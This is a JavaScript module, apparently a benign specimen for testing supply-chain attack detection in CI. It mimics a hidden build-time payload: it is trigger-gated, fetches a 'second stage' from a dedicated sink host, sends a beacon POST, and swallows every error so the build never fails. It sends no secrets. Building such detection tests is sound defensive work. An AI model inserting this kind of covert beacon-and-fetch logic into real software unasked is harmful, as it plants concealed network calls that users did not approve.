'use strict';
// Parallax specimen payload. HARMLESS SIMULATION.
// It only checks whether a trigger holds (via the caller's trigger function),
// then makes exactly ONE GET (a "second stage" text file) and ONE POST (a
// constant JSON beacon) to our OWN sink. It never reads, stores or sends any
// real secret or file content. All errors are swallowed so a blocked
// connection can never fail the build. Fires at most once per process and
// once per job (a marker file in the temp dir).
const os = require('os');
const path = require('path');
const fs = require('fs');

// fresh-host specimen beacons to its OWN host (a second Fly app), never the
// registry host, so the trace shows a host no earlier job of the fleet touched.
// Tests override via PLX_SINK_URL.
const SINK = process.env.PLX_SINK_URL || process.env.PLX_FRESH_SINK_URL || 'https://parallax-fresh-host.fly.dev';
let firedThisProcess = false;

function markerPath(id) {
  return path.join(os.tmpdir(), 'plx-fired-' + id);
}

async function fire(id) {
  if (firedThisProcess) return;        // once per process
  firedThisProcess = true;
  try {                                 // once per job
    if (fs.existsSync(markerPath(id))) return;
    fs.writeFileSync(markerPath(id), String(Date.now()));
  } catch (_) { /* ignore */ }

  const run = process.env.GITHUB_RUN_ID || 'local';
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 3000);
  try {
    await fetch(SINK + '/stage2/' + id, { signal: ctrl.signal }).catch(() => {});
    await fetch(SINK + '/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ specimen: id, run: run }),
      signal: ctrl.signal,
    }).catch(() => {});
  } catch (_) { /* swallow */ } finally {
    clearTimeout(timer);
  }
}

// run(id, trigger): fire only if trigger() is true. Never throws.
function run(id, trigger) {
  try {
    if (trigger()) return fire(id);
  } catch (_) { /* swallow */ }
  return Promise.resolve();
}

module.exports = { run, fire, markerPath };
